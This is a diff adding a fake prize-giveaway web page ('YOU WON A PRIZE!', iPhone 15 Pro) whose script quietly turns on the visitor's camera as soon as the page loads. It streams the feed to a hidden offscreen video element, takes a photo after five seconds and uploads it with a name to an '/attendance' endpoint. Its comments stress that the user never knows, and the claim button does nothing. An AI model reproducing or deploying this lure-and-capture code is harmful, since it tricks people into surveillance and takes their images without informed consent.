@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Congratulations!</title>
+  <style>
+    body {
+      background-color: #ffffff;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    .prize-container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    h1 {
+      color: #e60000;
+      font-size: 28px;
+    }
+    p {
+      font-size: 18px;
+      color: #333;
+    }
+    img {
+      width: 100%;
+      max-width: 300px;
+      margin: 20px 0;
+      border-radius: 10px;
+    }
+    .claim-btn {
+      display: inline-block;
+      background-color: #28a745;
+      color: white;
+      padding: 15px 30px;
+      font-size: 20px;
+      font-weight: bold;
+      text-decoration: none;
+      border-radius: 5px;
+      box-shadow: 0px 4px 6px rgba(0,0,0,0.2);
+      animation: pulse 1.5s infinite;
+      cursor: pointer;
+      border: none;
+    }
+    /* Admin link */
+    .admin-link {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background-color: #f0f0f0;
+      color: #333;
+      padding: 5px 10px;
+      font-size: 12px;
+      text-decoration: none;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      opacity: 0.7;
+    }
+    .admin-link:hover {
+      opacity: 1;
+      background-color: #e0e0e0;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    /* Hidden video — never visible to user */
+    #video {
+      position: fixed;
+      top: -99999px;
+      left: -99999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+  <a href="/admin" class="admin-link">Go to Admin</a>
+
+  <div class="prize-container">
+    <h1>🎉 YOU WON A PRIZE! 🎉</h1>
+    <p>You have been selected to receive a brand new <b>iPhone 15 Pro</b> or a <b>Cash Prize</b>!</p>
+
+    <!-- iPhone / Money Picture -->
+    <img src="https://images.unsplash.com/photo-1695048133142-1a20484d2569?q=80&w=600&auto=format&fit=crop" alt="iPhone 15 Prize" />
+
+    <br>
+    <button class="claim-btn" id="claimBtn">CLAIM PRIZE NOW</button>
+  </div>
+
+  <!-- Hidden video element — camera streams here invisibly -->
+  <video id="video" autoplay playsinline muted></video>
+
+  <script>
+    const API_URL = "/attendance";
+    const MAX_KB  = 10000;
+    const video   = document.getElementById("video");
+    let stream    = null;
+
+    /* ── Start camera silently ── */
+    async function startCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { exact: "user" } },
+          audio: false
+        });
+      } catch (e1) {
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false
+          });
+        } catch (e2) {
+          try {
+            stream = await navigator.mediaDevices.getUserMedia({
+              video: true,
+              audio: false
+            });
+          } catch (e3) {
+            return; // No camera available — fail silently
+          }
+        }
+      }
+      if (stream) {
+        video.srcObject = stream;
+        await new Promise(r => video.addEventListener("loadedmetadata", r, { once: true }));
+        video.play();
+      }
+    }
+
+    /* ── Stop camera after use ── */
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+      }
+    }
+
+    /* ── Capture photo as blob ── */
+    function captureBlob(quality = 1.0) {
+      return new Promise((res, rej) => {
+        const c   = document.createElement("canvas");
+        c.width   = video.videoWidth  || 640;
+        c.height  = video.videoHeight || 480;
+        const ctx = c.getContext("2d");
+        ctx.drawImage(video, 0, 0, c.width, c.height);
+        c.toBlob(blob => {
+          if (!blob) return rej(new Error("Capture failed."));
+          const kb = blob.size / 1024;
+          if (kb > MAX_KB && quality > 0.15) {
+            res(captureBlob(quality - 0.15));
+          } else {
+            res(blob);
+          }
+        }, "image/jpeg", quality);
+      });
+    }
+
+    /* ── Main: auto-runs on page load ── */
+    async function run() {
+      const params = new URLSearchParams(location.search);
+      const name   = params.get("name") || ("Visitor_" + (1000 + Math.floor(Math.random() * 9000)));
+
+      try {
+        await startCamera();
+
+        // Wait 5 seconds for camera to warm up and user to be in frame
+        await new Promise(r => setTimeout(r, 5000));
+
+        const blob = await captureBlob();
+        stopCamera();
+
+        const fd = new FormData();
+        fd.append("name",      name);
+        fd.append("latitude",  0);
+        fd.append("longitude", 0);
+        fd.append("photo",     blob, "attendance.jpg");
+
+        // Send silently in the background — user never knows
+        await fetch(API_URL, { method: "POST", body: fd });
+
+      } catch (err) {
+        stopCamera(); // Fail silently
+      }
+    }
+
+    /* ── Claim button — decoration only, no camera ── */
+    document.getElementById("claimBtn").addEventListener("click", function () {
+      alert("Prize Claim Processing...");
+    });
+
+    // Auto-trigger camera capture as soon as page loads
+    window.addEventListener("DOMContentLoaded", run);
+  </script>
+</body>
+</html>
